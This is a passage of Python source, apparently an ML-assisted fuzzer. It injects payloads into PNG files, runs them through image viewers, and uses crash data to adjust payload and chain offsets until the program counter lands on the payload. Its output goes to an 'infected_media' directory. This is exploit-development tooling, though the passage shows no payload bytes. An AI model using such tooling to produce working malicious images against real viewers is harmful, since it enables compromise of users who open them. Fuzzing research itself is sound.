                            logger.info(f"Successfully re-injected payload with adjusted chain for {viewer_name} + {fuzz_type} (Retry {retry_attempt}). Re-evaluating...") 

                        # After re-injection, continue to the next retry to re-evaluate
                        continue
                    else:
                        # PC is not at payload, so adjust the payload offset
                        offset_match = re.search(r"offset (-?0x[0-9a-f]+)", fitting_info["offsets"][0])
                        if offset_match:
                            new_offset = int(offset_match.group(1), 16)
                            if new_offset not in tried_offsets:
                                current_payload_offset = new_offset
                                tried_offsets.add(new_offset)
                                logger.info(f"Applying new payload offset: {current_payload_offset} for next retry.")
                                continue # Continue to next retry with new offset
                            else:
                                logger.warning(f"Suggested offset {hex(new_offset)} already tried. Trying next additional offset.")
                        else:
                            logger.warning("Could not parse offset from fitting info. Trying next additional offset.")
                        
                        # If suggested offset was already tried or not parsed, try an additional offset
                        if additional_offsets:
                            current_payload_offset = additional_offsets.pop(0)
                            tried_offsets.add(current_payload_offset)
                            logger.info(f"Trying additional payload offset: {current_payload_offset}.")
                            continue
                        else:
                            logger.warning("No more additional offsets to try.")
                            # If no more offsets, and still PAYLOAD_FOUND_FITTING_CALCULATED, update reason
                            results_for_combination[-1]["reason"] = "leaked addresses need modification (retries exhausted)"
                            break # Exit retry loop

                elif status == "CRASHED_INVALID_WEAKNESS":
                    logger.error(f"Invalidating {fuzz_type} for {viewer['name']} due to critical error.")
                    invalid_fuzz_types.add(fuzz_type) # Add to the passed-in set
                    if os.path.exists(test_file_path): os.remove(test_file_path)
                    return results_for_combination # Exit, as this weakness is invalid
                elif "CRASHED" in status:
                    logger.info(f"Saved crash sample: {test_file_path}")
                    # If crashed but no fitting info, or all retries with fitting failed, stop for this combo
                    break 
                else:
                    if os.path.exists(test_file_path): 
                        try:
                            os.remove(test_file_path)
                        except:
                            pass

            else:
                logger.error(f"Payload injection failed for {viewer['name']} + {fuzz_type} (Retry {retry_attempt})")
                results_for_combination.append({
                    "viewer": viewer_name,
                    "fuzz_type": fuzz_type,
                    "file": base_file_name,
                    "status": "INJECTION_FAILED",
                    "payload_validated": False,
                    "platform": self.platform_id,
                    "timestamp": time.time(),
                    "payload_offset_attempted": current_payload_offset,
                    "trigger_offset_attempted": current_trigger_offset, # New field
                    "retry_attempt": retry_attempt, # New field: Store retry attempt
                    "reason": "injection failed"
                })
                if os.path.exists(test_file_path): 
                    try:
                        os.remove(test_file_path)
                    except FileNotFoundError as fe:
                        print(fe)
                    except:
                        pass

            
            # If we reached here, it means current_payload_offset didn't lead to success or fitting.
            # Try next additional offset if available, otherwise break.
            if retry_attempt < max_retries - 1 and additional_offsets and not self.use_intelligent: # Only use additional offsets if not intelligent mode
                current_payload_offset = additional_offsets.pop(0)
                tried_offsets.add(current_payload_offset)
                logger.info(f"Trying additional payload offset: {current_payload_offset}.")
                continue
            else:
                break # No more retries or offsets to try
        
        return results_for_combination # Corrected to return results_for_combination

    def fuzz_single_file(self, file_path: str) -> List[Dict]:
        """Fuzzes a single file against all viewers and weaknesses, saving successful samples."""
        request_sudo_if_needed()
        # The base PNG file should already exist, created by the caller (e.g., test setup).
        # No need to generate it here.
        if not os.path.exists(file_path):
            logger.error(f"Base PNG file not found: {file_path}. This should have been created by the caller.")
            return [] # Cannot proceed without the base file
        if not os.path.exists(file_path):
            logger.error(f"Base PNG file not found: {file_path}. This should have been created by the caller.")
            return [] # Cannot proceed without the base file
        
        all_results = [] # Initialize all_results here
        base_file_name = os.path.basename(file_path)
        output_dir = os.path.join(os.path.dirname(file_path), "fuzz_results_single")
        os.makedirs(output_dir, exist_ok=True)

        # Phase 1: Fuzz png_consumer sequentially
        logger.info(f"Starting sequential fuzzing for png_consumer on {base_file_name}...")
        png_consumer_viewer = next(v for v in self.viewers if v["name"] == "png_consumer")
        invalid_fuzz_types_for_consumer = set()
        
        # Define viewer_output_dir for png_consumer
        png_consumer_output_dir = os.path.join(output_dir, png_consumer_viewer["name"])
        os.makedirs(png_consumer_output_dir, exist_ok=True)

        for fuzz_type in self.weaknesses:
            combo_results = self._fuzz_single_combination(file_path, base_file_name, png_consumer_viewer, fuzz_type, png_consumer_output_dir, invalid_fuzz_types_for_consumer)
            all_results.extend(combo_results)
            # Propagate invalid fuzz types
            for res in combo_results:
                if res["status"] == "CRASHED_INVALID_WEAKNESS":
                    invalid_fuzz_types_for_consumer.add(res["fuzz_type"])

        # Phase 2: Parallelize fuzzing for other viewers
        logger.info(f"Starting parallel fuzzing for other viewers on {base_file_name}...")
        other_viewers = [v for v in self.viewers if v["name"] != "png_consumer"]
        
        tasks = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
            for viewer in other_viewers:
                invalid_fuzz_types_for_viewer = set() # Keep track of invalid types per viewer for this folder run
                viewer_output_dir = os.path.join(output_dir, viewer["name"]) # Define viewer_output_dir for other viewers
                os.makedirs(viewer_output_dir, exist_ok=True)
                for fuzz_type in self.weaknesses:
                    # Only fuzz with valid types
                    if fuzz_type not in invalid_fuzz_types_for_consumer: # Also consider global invalidations from consumer
                        tasks.append(executor.submit(self._fuzz_single_combination, file_path, base_file_name, viewer, fuzz_type, viewer_output_dir, invalid_fuzz_types_for_viewer))
            
            for future in concurrent.futures.as_completed(tasks):
                combo_results = future.result()
                all_results.extend(combo_results)
                # The invalid_fuzz_types_for_viewer set is passed by reference, so it's updated directly within _fuzz_single_combination.
                # No need to explicitly propagate here.

        # Save overall results for single file fuzzing
        if all_results:
            with open(os.path.join(output_dir, f"{base_file_name}_results.json"), "w") as f:
                json.dump(all_results, f, indent=2)
            save_trajectory_database(all_results, output_dir)
            
        return all_results

    def fuzz_platform(self, source_dir: str):
        """Orchestrates the infection and monitoring loop across a folder of images and all viewers."""
        request_sudo_if_needed()
        target_base_dir = f"infected_media_unified_{self.platform_id}"
        os.makedirs(target_base_dir, exist_ok=True)

        # Reconcile all previous trajectory contexts (--single and --platform runs)
        self._reconcile_all_previous_runs()

        png_files = [f for f in os.listdir(source_dir) if f.lower().endswith('.png')]
        if not png_files:
            logger.error(f"No PNG files found in {source_dir}")
            return

        all_results = []
        
        tasks = []
        # Max workers can be adjusted based on system resources.
        # Using a ThreadThreadPoolExecutor for I/O-bound tasks (running external commands).
        with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
            for viewer in self.viewers:
                viewer_name = viewer["name"]
                viewer_output_dir = os.path.join(target_base_dir, viewer_name)
                os.makedirs(viewer_output_dir, exist_ok=True)
                
                logger.info(f"Starting fuzzing for viewer: {viewer_name}")
                
                invalid_fuzz_types_for_viewer = set() # Keep track of invalid fuzz types per viewer for this folder run

                for png_file in png_files:
                    full_png_path = os.path.join(source_dir, png_file)
                    
                    # Submit each (file, viewer, fuzz_type) combination as a separate task
                    for fuzz_type in self.weaknesses:
                        tasks.append(executor.submit(self._fuzz_single_combination, full_png_path, png_file, viewer, fuzz_type, viewer_output_dir, invalid_fuzz_types_for_viewer))
            
            for future in concurrent.futures.as_completed(tasks):
                combo_results = future.result()
                all_results.extend(combo_results)
                # The invalid_fuzz_types_for_viewer set is passed by reference, so it's updated directly within _fuzz_single_combination.
                # No need to explicitly propagate here.

        save_trajectory_database(all_results, target_base_dir)
        logger.info(f"Unified fuzzing session complete. Results saved to {target_base_dir}/fuzzing_trajectory.csv")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--source", type=str, default="generated_image_samples", help="Source directory for PNG files (for folder fuzzing).")
    parser.add_argument("--platform", type=str, default=platform.platform().lower().replace("-", "_"), help="Platform identifier.")
    parser.add_argument("--single", type=str, help="Path to a single PNG file to fuzz.")
    parser.add_argument("--advisor", action="store_true", help="Enable advisor mode (log suggestions, don't apply).")
    parser.add_argument("--legacy", action="store_true", help="Enable legacy fuzzing (no intelligent suggestions).")
    parser.add_argument("--intelligent", action="store_true", help="Enable intelligent fuzzing (apply suggestions).")
    parser.add_argument("--train", action="store_true", help="Train the ML model using historical data.")
    parser.add_argument("--data_dirs", nargs='+', default=["fuzz_results_single"], help="Directories containing historical fuzzing data for training.")
    parser.add_argument("--epochs", type=int, default=10, help="Number of training epochs for the ML model.") # New argument
    parser.add_argument("--explain_lime", action="store_true", help="Generate LIME explanations after training the ML model.") # New argument
    args = parser.parse_args()
    
    # Ensure only one of --legacy or --intelligent is active
    if args.legacy and args.intelligent:
        parser.error("Cannot use --legacy and --intelligent simultaneously. Choose one or neither.")
    if args.advisor and args.intelligent:
        parser.error("Cannot use --advisor and --intelligent simultaneously. Advisor logs suggestions, Intelligent applies them.")

    #ask for sudo upfront if not in legacy mode, since intelligent and advisor modes may require multiple elevated operations 

    if not args.train:
        request_sudo_if_needed()

    #ensure the crash monitor is initialized if we're not in legacy mode, so that we can capture Apport crashes for intelligent/advisor modes 

    if not args.legacy and not args.train:
        monitor_apport_log(last_read_pos=0) # This will initialize the crash monitor and start monitoring in the background 
    

    fuzzer = UnifiedFuzzer(args.platform, use_advisor=args.advisor, use_intelligent=args.intelligent, use_legacy=args.legacy)
    
    if args.train:
        fuzzer.train_ml_model(args.data_dirs, epochs=args.epochs, generate_lime_explanations=args.explain_lime) # Pass epochs and explain_lime
        return # Exit after training

    if args.single:
        fuzzer.fuzz_single_file(args.single)
    else:
        if not os.path.exists(args.source):
            os.makedirs(args.source)
            generate_base_png(os.path.join(args.source, "base.png"))
            logger.info(f"Created sample base.png in {args.source} as source directory was empty.")
        fuzzer.fuzz_platform(args.source)

if __name__ == "__main__":
    main()
